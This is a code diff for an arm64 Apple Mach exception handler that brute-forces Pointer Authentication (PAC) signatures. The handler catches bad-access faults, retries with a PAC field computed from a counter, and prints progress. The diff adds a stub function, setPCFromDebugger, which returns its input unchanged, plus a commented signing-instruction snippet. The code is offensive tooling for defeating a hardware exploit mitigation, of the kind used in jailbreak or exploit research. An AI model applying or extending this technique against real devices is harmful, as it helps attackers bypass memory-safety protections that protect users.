@@ -19,6 +19,15 @@
 #   define xpaci(x) (void)(x)
 #endif
 
+/*
+ 00000001954b2610    pacia    x16, x17
+ 00000001954b2614    str    x16, [x8, #0x10]
+ 00000001954b2618    ret
+ */
+uint64_t setPCFromDebugger(uint64_t addr, uint32_t diversifier) {
+    return addr;
+}
+
 typedef struct {
     uint64_t __x[29];       /* General purpose registers x0-x28 */
     uint64_t __fp; /* Frame pointer x29 */
@@ -64,15 +73,19 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
     static uint64_t pacFailedCount = 0;
     static uint64_t pacBruteForcedPtr = 0;
     if (exception == EXC_BAD_ACCESS && codeCnt == 2 && (code[0] == 1 || code[0] == 257) && (ptrL == ptrR || ptrL == 0xFFFFFFFF)) {
+        uint32_t diversifier = old_state->__flags & 0xFF000000;
         // Attempt to brute-force PAC
         // (pacFailedCount<<39) & ~0x0080000000000000: clear kernel pointer bit
         pacBruteForcedPtr = ((uint64_t)brX16Address & 0xFFFFFFFFF) | ((pacFailedCount << 39) & ~0x0080000000000000);
+        
+        pacBruteForcedPtr = setPCFromDebugger(pacBruteForcedPtr, diversifier);
         __darwin_arm_thread_state64_set_pc_presigned_fptr(*new_state, (void *)pacBruteForcedPtr);
         pacFailedCount++;
         if ((pacFailedCount % 99999) == 0) {
             printf("Still brute forcing PAC... total: %llu\n", pacFailedCount);
             printf("0x%016llx\n", pacBruteForcedPtr);
         }
+        
         return KERN_SUCCESS;
         
 //        printf("PAC failure detected?\n");
